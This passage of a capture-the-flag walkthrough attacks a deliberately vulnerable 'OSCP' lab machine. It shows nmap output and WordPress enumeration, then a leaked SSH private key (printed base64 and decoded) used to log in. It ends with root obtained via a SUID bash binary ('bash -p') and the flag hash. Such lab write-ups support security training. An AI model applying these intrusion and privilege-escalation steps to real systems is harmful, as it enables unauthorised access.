entry|_/secret.txt|_http-title: OSCP Voucher &amp;amp;#8211; Just another WordPress site| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS33060/tcp open mysqlx? syn-ack| fingerprint-strings:| DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afpWeb EnumerationWhat we have in front of us is a Wordpress v5.4.2 site. The only interesting informations we can get from the site itself is the name of the user on the VM:Running WPScan agaisnt it reveal some CVEs but it doesn’t gets us anywhereAt the root of the site, enumeration finds a text file named “secret.txt”… interesting..In this file, we find a base64 encoded string which we decode using Cyberchef. The result is a SSH private key:LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ[...]ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgprdW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBhbWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAtHCsSzHtUF8K8tiOqECQYLrKKrCRsbvq6iIG7R9g0WPv9w+gkUWe[...]Bn2FN6kw4GLZiVcqUT6aY68njLihtDpeeSzopSjyKh10bNwRS0DAILscWg6xc/R8yueAeIRcw85udkhNVWperg4OsiFZMpwKqcMlt8i6lVmoUBjRtBD4g5MYWRANO0Nj9VWMTbW9RLiRkuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=-----END OPENSSH PRIVATE KEY-----FootholdHaving the key in hands, we now have to find with which user we can use it.Remember the blog post about “the only user on this box” ? Let’s try this..ssh oscp@1.1.1.1 -i secret_id_rsaIt works.. we now have a foothold as “oscp” user.Privilege EscalationNow it’s time to escalate our privileges to root. Let’s start with the basic linux privilege escalation checklist: sudo permissions : nothing cron jobs : nothing SUID binaries : /usr/bin/bash has setuid bit setbash-5.0$ /usr/bin/bash -pbash-5.0# id &amp;amp;&amp;amp; hostnameuid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)oscpbash-5.0# cat /root/flag.txtd73b04b0e696b0945283defa3eee4538Thanks for reading &amp;lt;3h3x" } ]
